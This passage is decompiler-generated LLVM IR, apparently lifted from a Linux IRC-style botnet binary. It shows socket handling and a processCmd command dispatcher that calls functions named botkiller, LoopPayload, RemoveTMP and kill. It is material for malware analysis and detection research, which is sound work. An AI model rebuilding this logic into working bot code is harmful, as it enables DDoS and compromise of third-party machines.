  %v0_804f2dc = load i32, i32* %stack_var_-208, align 4
  %v1_804f2dc = call i32 @__libc_close(i32 %v0_804f2dc)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f131, align 4
  br label %dec_label_pc_804f3d5

dec_label_pc_804f2f4:                             ; preds = %dec_label_pc_804f294
  store i8 2, i8* %v5_804f131, align 4
  br label %dec_label_pc_804f3d5

dec_label_pc_804f304:                             ; preds = %dec_label_pc_804f212
  %v13_804f304 = icmp eq i32 %v5_804f283, -1
  %v1_804f308 = icmp eq i1 %v13_804f304, false
  br i1 %v1_804f308, label %dec_label_pc_804f3d5, label %dec_label_pc_804f30e

dec_label_pc_804f30e:                             ; preds = %dec_label_pc_804f304
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v5_804f314 = load i32, i32* %v4_804f231, align 8
  store i32 %v5_804f314, i32* %eax.global-to-local, align 4
  %v2_804f31a = add i32 %v0_804f288, 16
  %v3_804f31a = inttoptr i32 %v2_804f31a to i32*
  store i32 %v5_804f314, i32* %v3_804f31a, align 4
  %v1_804f31b = call i32 @__libc_close(i32 %v5_804f283)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f131, align 4
  br label %dec_label_pc_804f3d5

dec_label_pc_804f333:                             ; preds = %dec_label_pc_804f14f
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804f21c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804f344 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v3_804f352 = add i32 %v2_804f131, %v2_804f0af
  %v4_804f352 = inttoptr i32 %v3_804f352 to i32*
  %v5_804f352 = load i32, i32* %v4_804f352, align 8
  %v2_804f357 = udiv i32 %v5_804f352, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v5_804f360 = load i32, i32* %v4_804f352, align 8
  %v1_804f363 = urem i32 %v5_804f360, 32
  store i32 %v1_804f363, i32* %eax.global-to-local, align 4
  %v0_804f366 = load i32, i32* @ebp, align 4
  %v2_804f366 = mul nuw nsw i32 %v2_804f357, 4
  %v3_804f366 = add nsw i32 %v2_804f366, -192
  %v4_804f366 = add i32 %v3_804f366, %v0_804f366
  %v5_804f366 = inttoptr i32 %v4_804f366 to i32*
  %v6_804f366 = load i32, i32* %v5_804f366, align 4
  %v9_804f366 = shl i32 1, %v1_804f363
  %v12_804f366 = or i32 %v6_804f366, %v9_804f366
  store i32 %v12_804f366, i32* %v5_804f366, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v5_804f388 = load i32, i32* %v4_804f352, align 8
  %v1_804f38b = add i32 %v5_804f388, 1
  store i32 %v1_804f38b, i32* %edx.global-to-local, align 4
  %v0_804f38e = load i32, i32* @esp, align 4
  %v2_804f397 = add i32 %v0_804f38e, -16
  %v3_804f397 = inttoptr i32 %v2_804f397 to i32*
  store i32 %v2_804f270, i32* %v3_804f397, align 4
  store i32 %v2_804f21c, i32* %eax.global-to-local, align 4
  %v2_804f39e = add i32 %v0_804f38e, -20
  %v3_804f39e = inttoptr i32 %v2_804f39e to i32*
  store i32 %v2_804f21c, i32* %v3_804f39e, align 4
  %v1_804f39f = add i32 %v0_804f38e, -24
  %v2_804f39f = inttoptr i32 %v1_804f39f to i32*
  store i32 0, i32* %v2_804f39f, align 4
  %v1_804f3a1 = add i32 %v0_804f38e, -28
  %v2_804f3a1 = inttoptr i32 %v1_804f3a1 to i32*
  store i32 0, i32* %v2_804f3a1, align 4
  %v0_804f3a3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f3a3 = add i32 %v0_804f38e, -32
  %v3_804f3a3 = inttoptr i32 %v2_804f3a3 to i32*
  store i32 %v0_804f3a3, i32* %v3_804f3a3, align 4
  %v0_804f3a4 = load i32, i32* %stack_var_-204, align 4
  %v2_804f3a4 = load i32, i32* %stack_var_-196, align 4
  %v5_804f3a4 = call i32 @__libc_select(i32 %v0_804f3a4, i32 10000, i32 %v2_804f3a4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f3a4, i32* %eax.global-to-local, align 4
  %v4_804f3af = icmp eq i32 %v5_804f3a4, 0
  br i1 %v4_804f3af, label %dec_label_pc_804f3d5, label %dec_label_pc_804f3b5

dec_label_pc_804f3b5:                             ; preds = %dec_label_pc_804f333
  %v0_804f3a9 = load i32, i32* @esp, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  %v5_804f3bb = load i32, i32* %v4_804f352, align 8
  store i32 %v5_804f3bb, i32* %eax.global-to-local, align 4
  %v2_804f3c1 = add i32 %v0_804f3a9, 16
  %v3_804f3c1 = inttoptr i32 %v2_804f3c1 to i32*
  store i32 %v5_804f3bb, i32* %v3_804f3c1, align 4
  %v1_804f3c2 = call i32 @__libc_close(i32 %v5_804f3a4)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f0af, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f131, align 4
  br label %dec_label_pc_804f3d5

dec_label_pc_804f3d5:                             ; preds = %dec_label_pc_804f15c, %dec_label_pc_804f333, %dec_label_pc_804f304, %dec_label_pc_804f30e, %dec_label_pc_804f2f4, %dec_label_pc_804f2cf, %dec_label_pc_804f202, %dec_label_pc_804f1e8, %dec_label_pc_804f3b5
  %v4_804f3d5 = add nuw nsw i32 %storemerge41, 1
  store i32 %v4_804f3d5, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804f3d5, %v2_804f038
  br i1 %exitcond, label %dec_label_pc_804f3d8.dec_label_pc_804f3e4.loopexit_crit_edge, label %dec_label_pc_804f12b

dec_label_pc_804f3d8.dec_label_pc_804f3e4.loopexit_crit_edge: ; preds = %dec_label_pc_804f3d5
  %v0_804f3e4.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f3e4

dec_label_pc_804f3e4:                             ; preds = %dec_label_pc_804f3d8.preheader, %dec_label_pc_804f3d8.dec_label_pc_804f3e4.loopexit_crit_edge, %dec_label_pc_804f079
  %v0_804f3e4 = phi i32 [ %v1_804f111, %dec_label_pc_804f079 ], [ %v0_804f3e4.pre.pre, %dec_label_pc_804f3d8.dec_label_pc_804f3e4.loopexit_crit_edge ], [ %v1_804f3ee, %dec_label_pc_804f3d8.preheader ]
  %stack_var_-44.0 = phi i32 [ %tmp10, %dec_label_pc_804f079 ], [ %v2_804f038, %dec_label_pc_804f3d8.dec_label_pc_804f3e4.loopexit_crit_edge ], [ 0, %dec_label_pc_804f3d8.preheader ]
  %v1_804f3e7 = add i32 %v0_804f3e4, -16
  %v2_804f3e7 = inttoptr i32 %v1_804f3e7 to i32*
  store i32 0, i32* %v2_804f3e7, align 4
  %v1_804f3e9 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_804f3e9 = call i32 @__GI_time(i32* %v1_804f3e9)
  store i32 %v2_804f3e9, i32* %eax.global-to-local, align 4
  %v5_804f3f4 = icmp slt i32 %v2_804f3e9, %v5_804f114
  br i1 %v5_804f3f4, label %dec_label_pc_804f3d8.preheader, label %dec_label_pc_804f3fa

dec_label_pc_804f3d8.preheader:                   ; preds = %dec_label_pc_804f3e4
  %v0_804f3ee = load i32, i32* @esp, align 4
  %v1_804f3ee = add i32 %v0_804f3ee, 16
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804f3de40, label %dec_label_pc_804f12b, label %dec_label_pc_804f3e4

dec_label_pc_804f3fa:                             ; preds = %dec_label_pc_804f3e4, %entry
  %v0_804f406 = phi i32 [ %v3_804f068, %entry ], [ %v2_804f3e9, %dec_label_pc_804f3e4 ]
  %v2_804f403 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f403, i32* @ebx, align 4
  store i32 %v0_804f01a, i32* @edi, align 4
  ret i32 %v0_804f406

; uselistorder directives
  uselistorder i32 %v4_804f3d5, { 1, 2, 0 }
  uselistorder i32 %v1_804f363, { 1, 0 }
  uselistorder i32 %v0_804f288, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v5_804f283, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804f242, { 1, 0 }
  uselistorder i32* %v4_804f231, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_804f19c, { 2, 0, 1 }
  uselistorder i32 %v7_804f131, { 2, 1, 3, 4, 5, 6, 7, 0 }
  uselistorder i8* %v5_804f131, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %storemerge41, { 0, 15, 14, 13, 12, 11, 7, 6, 10, 9, 8, 5, 4, 3, 21, 20, 19, 18, 17, 16, 22, 1, 2 }
  uselistorder i32 %v2_804f21c, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_804f0cc, { 1, 0 }
  uselistorder i32 %v2_804f0af, { 20, 19, 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 25, 24, 23, 22, 2, 21, 3, 7, 26, 6, 4, 5 }
  uselistorder i32 %v1_804f046, { 1, 0 }
  uselistorder i32 %v2_804f038, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804f02a, { 1, 0, 2 }
  uselistorder i32 %v12_804f01c, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-196, { 2, 3, 1, 0, 4 }
  uselistorder i32* %stack_var_-204, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %eax.global-to-local, { 53, 44, 43, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 8, 4, 3, 2, 1, 0 }
  uselistorder i32 -24, { 1, 0, 2, 3, 4, 8, 7, 6, 5, 9, 10, 11, 12 }
  uselistorder i32 -20, { 1, 0, 2, 3, 4, 8, 7, 6, 5, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_804f3d5, { 8, 1, 3, 2, 4, 5, 6, 7, 0 }
}

define i32 @processCmd() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp207 = call i32 @__decompiler_undefined_function_0()
  %tmp223 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-508 = alloca i32, align 4
  %stack_var_-492 = alloca i32, align 4
  %stack_var_-476 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f40a = load i32, i32* @edi, align 4
  %v0_804f40b = load i32, i32* @esi, align 4
  %v0_804f40c = load i32, i32* @ebx, align 4
  store i32 %v0_804f40c, i32* %stack_var_-16, align 4
  %v5_804f40d = icmp ult i32* %stack_var_-16, inttoptr (i32 428 to i32*)
  store i1 %v5_804f40d, i1* %cf.global-to-local, align 1
  %v1_804f416 = inttoptr i32 %tmp223 to i32*
  %v2_804f416 = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804f433 = inttoptr i32 %v2_804f416 to i8*
  store i32 %v2_804f416, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8058777.21 to i32), i32* @edi, align 4
  %v7_804f445 = call i32 @_strncmp(i8* %v4_804f433, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058777.21, i32 0, i32 0), i32 5)
  %v8_804f445 = urem i32 %v7_804f445, 2
  %v9_804f445 = icmp eq i32 %v8_804f445, 0
  %v0_804f447 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f447 = or i1 %v0_804f447, %v9_804f445
  %v3_804f447 = zext i1 %v2_804f447 to i32
  %v4_804f447 = load i32, i32* @edx, align 4
  %v5_804f447 = and i32 %v4_804f447, -256
  %v6_804f447 = or i32 %v3_804f447, %v5_804f447
  %v7_804f447 = xor i32 %v6_804f447, 1
  store i32 %v7_804f447, i32* %edx.global-to-local, align 4
  %v1_804f44f = trunc i32 %v7_804f447 to i8
  %v3_804f44f = zext i1 %v0_804f447 to i8
  %v15_804f44f = icmp eq i8 %v1_804f44f, %v3_804f44f
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f458 = icmp eq i1 %v15_804f44f, false
  br i1 %v1_804f458, label %dec_label_pc_804f475, label %dec_label_pc_804f45a

dec_label_pc_804f45a:                             ; preds = %entry
  %v0_804f45a = load i32, i32* @global_var_805f8c0.20, align 64
  %v0_804f45f = load i32, i32* @esp, align 4
  %v5_804f45f = icmp ult i32 %v0_804f45f, 8
  store i1 %v5_804f45f, i1* %cf.global-to-local, align 1
  store i32 %v0_804f45a, i32* %stack_var_-460, align 4
  %v3_804f468 = call i32 @HackerPrint(i32 %v0_804f45a, i32 ptrtoint ([6 x i8]* @global_var_805c819.866 to i32))
  %v0_804f46d = load i32, i32* @esp, align 4
  %v2_804f46d = icmp ugt i32 %v0_804f46d, -17
  store i1 %v2_804f46d, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050835

dec_label_pc_804f475:                             ; preds = %entry
  %v2_804f478 = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804f495 = inttoptr i32 %v2_804f478 to i8*
  store i32 %v2_804f478, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805c81f.867 to i32), i32* @edi, align 4
  %v7_804f4a7 = call i32 @_strncmp(i8* %v4_804f495, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805c81f.867, i32 0, i32 0), i32 11)
  %v8_804f4a7 = urem i32 %v7_804f4a7, 2
  %v9_804f4a7 = icmp eq i32 %v8_804f4a7, 0
  %v0_804f4a9 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f4a9 = or i1 %v0_804f4a9, %v9_804f4a7
  %v3_804f4a9 = zext i1 %v2_804f4a9 to i32
  %v4_804f4a9 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f4a9 = and i32 %v4_804f4a9, -256
  %v6_804f4a9 = or i32 %v3_804f4a9, %v5_804f4a9
  %v7_804f4a9 = xor i32 %v6_804f4a9, 1
  store i32 %v7_804f4a9, i32* %edx.global-to-local, align 4
  %v1_804f4b1 = trunc i32 %v7_804f4a9 to i8
  %v3_804f4b1 = zext i1 %v0_804f4a9 to i8
  %v15_804f4b1 = icmp eq i8 %v1_804f4b1, %v3_804f4b1
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f4ba = icmp eq i1 %v15_804f4b1, false
  br i1 %v1_804f4ba, label %dec_label_pc_804f4ea, label %dec_label_pc_804f4bc

dec_label_pc_804f4bc:                             ; preds = %dec_label_pc_804f475
  %v0_804f4bc = load i32, i32* @esp, align 4
  %v5_804f4bc = icmp ult i32 %v0_804f4bc, 12
  store i1 %v5_804f4bc, i1* %cf.global-to-local, align 1
  %v0_804f4bf = load i8*, i8** @global_var_8065b48.232, align 4
  %v1_804f4bf = ptrtoint i8* %v0_804f4bf to i32
  store i32 %v1_804f4bf, i32* %stack_var_-460, align 4
  %v1_804f4c5 = call i32 @__GI_inet_ntoa(i32 %v1_804f4bf)
  %v0_804f4cd = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_804f4cd, i32* %edx.global-to-local, align 4
  %v5_804f4d3 = icmp ult i32* %stack_var_-444, inttoptr (i32 4 to i32*)
  store i1 %v5_804f4d3, i1* %cf.global-to-local, align 1
  store i32 %v0_804f4cd, i32* %stack_var_-460, align 4
  %v3_804f4dd = call i32 @HackerPrint(i32 %v0_804f4cd, i32 ptrtoint ([10 x i8]* @global_var_805c82a.868 to i32))
  %v0_804f4e2 = load i32, i32* @esp, align 4
  %v2_804f4e2 = icmp ugt i32 %v0_804f4e2, -17
  store i1 %v2_804f4e2, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050835

dec_label_pc_804f4ea:                             ; preds = %dec_label_pc_804f475
  %v2_804f4ed = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804f50a = inttoptr i32 %v2_804f4ed to i8*
  store i32 %v2_804f4ed, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805c834.869 to i32), i32* @edi, align 4
  %v7_804f51c = call i32 @_strncmp(i8* %v4_804f50a, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805c834.869, i32 0, i32 0), i32 8)
  %v8_804f51c = urem i32 %v7_804f51c, 2
  %v9_804f51c = icmp eq i32 %v8_804f51c, 0
  %v0_804f51e = load i1, i1* %cf.global-to-local, align 1
  %v2_804f51e = or i1 %v0_804f51e, %v9_804f51c
  %v3_804f51e = zext i1 %v2_804f51e to i32
  %v4_804f51e = load i32, i32* %edx.global-to-local, align 4
  %v5_804f51e = and i32 %v4_804f51e, -256
  %v6_804f51e = or i32 %v3_804f51e, %v5_804f51e
  %v7_804f51e = xor i32 %v6_804f51e, 1
  store i32 %v7_804f51e, i32* @edx, align 4
  %v1_804f526 = trunc i32 %v7_804f51e to i8
  %v3_804f526 = zext i1 %v0_804f51e to i8
  %v15_804f526 = icmp eq i8 %v1_804f526, %v3_804f526
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f52f = icmp eq i1 %v15_804f526, false
  br i1 %v1_804f52f, label %dec_label_pc_804f564, label %dec_label_pc_804f531

dec_label_pc_804f531:                             ; preds = %dec_label_pc_804f4ea
  %v0_804f531 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f536 = icmp eq i32 %v0_804f531, 0
  %v1_804f538 = icmp eq i1 %v1_804f536, false
  br i1 %v1_804f538, label %dec_label_pc_804f564, label %dec_label_pc_804f53a

dec_label_pc_804f53a:                             ; preds = %dec_label_pc_804f531
  %v0_804f53a = load i32, i32* @global_var_805f8c0.20, align 64
  %v0_804f53f = load i32, i32* @esp, align 4
  %v5_804f53f = icmp ult i32 %v0_804f53f, 8
  store i1 %v5_804f53f, i1* %cf.global-to-local, align 1
  store i32 %v0_804f53a, i32* %stack_var_-460, align 4
  %v3_804f548 = call i32 @HackerPrint(i32 %v0_804f53a, i32 ptrtoint ([13 x i8]* @global_var_805c83c.870 to i32))
  %v0_804f54d = load i32, i32* @esp, align 4
  %v2_804f54d = icmp ugt i32 %v0_804f54d, -17
  store i1 %v2_804f54d, i1* %cf.global-to-local, align 1
  %v0_804f550 = call i32 @botkiller()
  %v0_804f555 = call i32 @RemoveTMP()
  %v0_804f55a = load i32, i32* @esp, align 4
  %v5_804f55a = icmp ult i32 %v0_804f55a, 12
  store i1 %v5_804f55a, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-460, align 4
  %v1_804f55f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f564:                             ; preds = %dec_label_pc_804f531, %dec_label_pc_804f4ea
  %v2_804f567 = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804f584 = inttoptr i32 %v2_804f567 to i8*
  store i32 %v2_804f567, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805c849.871 to i32), i32* @edi, align 4
  %v7_804f596 = call i32 @_strncmp(i8* %v4_804f584, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805c849.871, i32 0, i32 0), i32 7)
  %v8_804f596 = urem i32 %v7_804f596, 2
  %v9_804f596 = icmp eq i32 %v8_804f596, 0
  %v0_804f598 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f598 = or i1 %v0_804f598, %v9_804f596
  %v3_804f598 = zext i1 %v2_804f598 to i32
  %v4_804f598 = load i32, i32* @edx, align 4
  %v5_804f598 = and i32 %v4_804f598, -256
  %v6_804f598 = or i32 %v3_804f598, %v5_804f598
  %v7_804f598 = xor i32 %v6_804f598, 1
  store i32 %v7_804f598, i32* @edx, align 4
  %v1_804f5a0 = trunc i32 %v7_804f598 to i8
  %v3_804f5a0 = zext i1 %v0_804f598 to i8
  %v15_804f5a0 = icmp eq i8 %v1_804f5a0, %v3_804f5a0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f5a9 = icmp eq i1 %v15_804f5a0, false
  br i1 %v1_804f5a9, label %dec_label_pc_804f5d9, label %dec_label_pc_804f5ab

dec_label_pc_804f5ab:                             ; preds = %dec_label_pc_804f564
  %v0_804f5ab = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f5b0 = icmp eq i32 %v0_804f5ab, 0
  %v1_804f5b2 = icmp eq i1 %v1_804f5b0, false
  br i1 %v1_804f5b2, label %dec_label_pc_804f5d9, label %dec_label_pc_804f5b4

dec_label_pc_804f5b4:                             ; preds = %dec_label_pc_804f5ab
  %v0_804f5b4 = load i32, i32* @global_var_805f8c0.20, align 64
  %v0_804f5b9 = load i32, i32* @esp, align 4
  %v5_804f5b9 = icmp ult i32 %v0_804f5b9, 8
  store i1 %v5_804f5b9, i1* %cf.global-to-local, align 1
  store i32 %v0_804f5b4, i32* %stack_var_-460, align 4
  %v3_804f5c2 = call i32 @HackerPrint(i32 %v0_804f5b4, i32 ptrtoint ([16 x i8]* @global_var_805c850.872 to i32))
  %v0_804f5c7 = load i32, i32* @esp, align 4
  %v2_804f5c7 = icmp ugt i32 %v0_804f5c7, -17
  store i1 %v2_804f5c7, i1* %cf.global-to-local, align 1
  %v0_804f5ca = call i32 @LoopPayload()
  %v0_804f5cf = load i32, i32* @esp, align 4
  %v5_804f5cf = icmp ult i32 %v0_804f5cf, 12
  store i1 %v5_804f5cf, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-460, align 4
  %v1_804f5d4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f5d9:                             ; preds = %dec_label_pc_804f5ab, %dec_label_pc_804f564
  %v2_804f5dc = load i32, i32* %v1_804f416, align 4
  store i1 false, i1* @df, align 1
  %v4_804f5f9 = inttoptr i32 %v2_804f5dc to i8*
  store i32 %v2_804f5dc, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805c860.873 to i32), i32* @edi, align 4
  %v7_804f60b = call i32 @_strncmp(i8* %v4_804f5f9, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805c860.873, i32 0, i32 0), i32 7)
  %v8_804f60b = urem i32 %v7_804f60b, 2
  %v9_804f60b = icmp eq i32 %v8_804f60b, 0
  %v0_804f60d = load i1, i1* %cf.global-to-local, align 1
  %v2_804f60d = or i1 %v0_804f60d, %v9_804f60b
  %v3_804f60d = zext i1 %v2_804f60d to i32
  %v4_804f60d = load i32, i32* @edx, align 4
  %v5_804f60d = and i32 %v4_804f60d, -256
  %v6_804f60d = or i32 %v3_804f60d, %v5_804f60d
  %v7_804f60d = xor i32 %v6_804f60d, 1
  store i32 %v7_804f60d, i32* %edx.global-to-local, align 4
  %v1_804f615 = trunc i32 %v7_804f60d to i8
  %v3_804f615 = zext i1 %v0_804f60d to i8
  %v15_804f615 = icmp eq i8 %v1_804f615, %v3_804f615
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f61e = icmp eq i1 %v15_804f615, false
  br i1 %v1_804f61e, label %dec_label_pc_804f766, label %dec_label_pc_804f624

dec_label_pc_804f624:                             ; preds = %dec_label_pc_804f5d9
  %v8_804f624 = icmp ult i32 %tmp207, 2
  store i1 %v8_804f624, i1* %cf.global-to-local, align 1
  %v12_804f624 = icmp eq i32 %tmp207, 2
  br i1 %v12_804f624, label %dec_label_pc_804f645, label %dec_label_pc_804f62a

dec_label_pc_804f62a:                             ; preds = %dec_label_pc_804f624
  %v0_804f62a = load i32, i32* @global_var_805f8c0.20, align 64
  %v0_804f62f = load i32, i32* @esp, align 4
  %v5_804f62f = icmp ult i32 %v0_804f62f, 8
  store i1 %v5_804f62f, i1* %cf.global-to-local, align 1
  store i32 %v0_804f62a, i32* %stack_var_-460, align 4
  %v3_804f638 = call i32 @HackerPrint(i32 %v0_804f62a, i32 ptrtoint ([16 x i8]* @global_var_805c867.874 to i32))
  %v0_804f63d = load i32, i32* @esp, align 4
  %v2_804f63d = icmp ugt i32 %v0_804f63d, -17
  store i1 %v2_804f63d, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050835

dec_label_pc_804f645:                             ; preds = %dec_label_pc_804f624
  %v1_804f648 = add i32 %tmp223, 4
  %v5_804f648 = icmp ugt i32 %tmp223, -5
  store i1 %v5_804f648, i1* %cf.global-to-local, align 1
  %v1_804f64b = inttoptr i32 %v1_804f648 to i32*
  %v2_804f64b = load i32, i32* %v1_804f64b, align 4
  store i1 false, i1* @df, align 1
  %v4_804f668 = inttoptr i32 %v2_804f64b to i8*
  store i32 %v2_804f64b, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805c877.875 to i32), i32* @edi, align 4
  %v7_804f67a = call i32 @_strncmp(i8* %v4_804f668, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c877.875, i32 0, i32 0), i32 4)
  %v8_804f67a = urem i32 %v7_804f67a, 2
  %v9_804f67a = icmp eq i32 %v8_804f67a, 0
  %v0_804f67c = load i1, i1* %cf.global-to-local, align 1
  %v2_804f67c = or i1 %v0_804f67c, %v9_804f67a
  %v3_804f67c = zext i1 %v2_804f67c to i32
  %v4_804f67c = load i32, i32* %edx.global-to-local, align 4
  %v5_804f67c = and i32 %v4_804f67c, -256
  %v6_804f67c = or i32 %v3_804f67c, %v5_804f67c
  %v7_804f67c = xor i32 %v6_804f67c, 1
  store i32 %v7_804f67c, i32* @edx, align 4
  %v1_804f684 = trunc i32 %v7_804f67c to i8
  %v3_804f684 = zext i1 %v0_804f67c to i8
  %v15_804f684 = icmp eq i8 %v1_804f684, %v3_804f684
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f68d = icmp eq i1 %v15_804f684, false
  br i1 %v1_804f68d, label %dec_label_pc_804f6cf, label %dec_label_pc_804f68f

dec_label_pc_804f68f:                             ; preds = %dec_label_pc_804f645
  %v0_804f68f = load i32, i32* @global_var_8065b50.876, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f694 = icmp eq i32 %v0_804f68f, 0
  br i1 %v1_804f694, label %dec_label_pc_8050835, label %dec_label_pc_804f69c

dec_label_pc_804f69c:                             ; preds = %dec_label_pc_804f68f
  %v0_804f6a1 = load i32, i32* @esp, align 4
  %v5_804f6a1 = icmp ult i32 %v0_804f6a1, 8
  store i1 %v5_804f6a1, i1* %cf.global-to-local, align 1
  store i32 %v0_804f68f, i32* %stack_var_-476, align 4
  %v2_804f6a7 = call i32 @kill(i32 %v0_804f68f, i32 9)
  %v0_804f6af = load i32, i32* @global_var_805f8c0.20, align 64
  %v5_804f6b4 = icmp ult i32* %stack_var_-460, inttoptr (i32 8 to i32*)
  store i1 %v5_804f6b4, i1* %cf.global-to-local, align 1
  store i32 %v0_804f6af, i32* %stack_var_-476, align 4
  %v2_804f6bd = call i32 @HackerPrint(i32 %v0_804f6af, i32 ptrtoint ([5 x i8]* @global_var_805c87b.877 to i32))
  %v0_804f6c2 = load i32, i32* @esp, align 4
  %v2_804f6c2 = icmp ugt i32 %v0_804f6c2, -17
  store i1 %v2_804f6c2, i1* %cf.global-to-local, align 1
  store i32 0, i32* @global_var_8065b50.876, align 16
  br label %dec_label_pc_804f6cf

dec_label_pc_804f6cf:                             ; preds = %dec_label_pc_804f645, %dec_label_pc_804f69c
  store i1 %v5_804f648, i1* %cf.global-to-local, align 1
  %v2_804f6d5 = load i32, i32* %v1_804f64b, align 4
  store i1 false, i1* @df, align 1
  %v4_804f6f2 = inttoptr i32 %v2_804f6d5 to i8*
  %v7_804f704 = call i32 @_strncmp(i8* %v4_804f6f2, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805c880.878, i32 0, i32 0), i32 3)
  %v8_804f704 = urem i32 %v7_804f704, 2
  %v9_804f704 = icmp eq i32 %v8_804f704, 0
  %v0_804f706 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f706 = or i1 %v0_804f706, %v9_804f704
  %v3_804f706 = zext i1 %v2_804f706 to i32
  %v4_804f706 = load i32, i32* @edx, align 4
  %v5_804f706 = and i32 %v4_804f706, -256
  %v6_804f706 = or i32 %v3_804f706, %v5_804f706
  %v7_804f706 = xor i32 %v6_804f706, 1
  store i32 %v7_804f706, i32* %edx.global-to-local, align 4
  %v1_804f70e = trunc i32 %v7_804f706 to i8
  %v3_804f70e = zext i1 %v0_804f706 to i8
  %v15_804f70e = icmp eq i8 %v1_804f70e, %v3_804f70e
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f717 = icmp eq i1 %v15_804f70e, false
